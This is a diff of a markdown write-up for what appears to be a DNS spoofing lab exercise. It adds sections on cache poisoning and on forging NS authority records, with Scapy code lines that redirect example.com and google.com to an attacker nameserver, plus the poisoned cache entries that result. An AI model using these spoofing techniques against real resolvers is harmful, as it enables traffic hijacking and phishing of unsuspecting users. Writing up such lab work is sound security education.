@@ -31,7 +31,7 @@ If we explicitly ask the attacker nameserver, we get a different (and false) IP 
 #### Our goal: Get the user to ask the malicious nameserver first.  
 ---
 
-## 3.1 Directly Spoofing Response to User
+## 3.1: Task 1 Directly Spoofing Response to User
 
 This is the script we used to spoof the DNS packet.
 ``` python
@@ -75,7 +75,7 @@ The answer now contains the attacker machine's IP address (```10.9.0.1```) and n
 
 ---
 
-## Task 2: DNS Cache Poisoning Attack - Spoofing Answers
+## 3.2: Task 2: DNS Cache Poisoning Attack - Spoofing Answers
 
 We now want to be the 'man in the middle' between the local DNS server and a remote authoritative DNS server. 
 
@@ -93,8 +93,58 @@ www.example.com.        259200  IN      A       10.9.0.1
 ```
 as well.
 
-But the local DNS server cache also contains:
+But now the local DNS server cache is also poisoned and contains:
 
 ```
 www.example.com.        863957  A       10.9.0.1
+```
+
+---
+
+## 3.3: Task 3: Spoofing NS Records
+
+Now we want to add an Authority Section to out spoofed DNS reply. This will lead to the local DNS server saving our malicious name server in its cache as the authority responsible for the entire ``` example.com ``` domain. Therefore, when a user makes a DNS request to the local DNS server about any subdomain like ``` mail.example.com ```, the request will be forwarded to the attacker nameserver.
+
+To achieve this, we just create the section in our script with this line:
+
+```python
+NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
+```
+
+To include it in our spoofed DNS packet, we have to modify the ```nscount``` and ```ns``` properties in the instantiation of our DNS object:
+
+```python
+dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, an=Anssec, ns=NSsec1)
+```
+
+The rest of the script remains as before.
+
+So if we now execute ```dig mail.example.com``` on the ```user**``` machine, we see the wrong IP address provided by the malicious nameserver:
+
+![image](https://github.com/user-attachments/assets/0b0e097d-f17f-4050-b4c0-895b67fe4eb4)
+
+Further, the local DNS server cache now contains the entry:
+
+```
+example.com.            777584  NS      ns.attacker32.com.
+```
+
+This means every request made to the DNS server for this domain is forwarded to our attacker nameserver if there is no entry for the specific hostname already in the cache.
+
+---
+
+## 3.4: Task 4: Spoofing NS Records for Another Domain
+
+Now we want our spoofed reply to also add a cache entry for the ```google.com``` domain. To do this, we just add another element to the authority section.
+
+The creation of the additional element in the authority section works in the same way as before:
+
+```python
+ NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
+```
+
+Of course, we have to inlude this in the DNS object as well:
+
+```python
+dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=Anssec, ns=NSsec1/NSsec2)
 ```
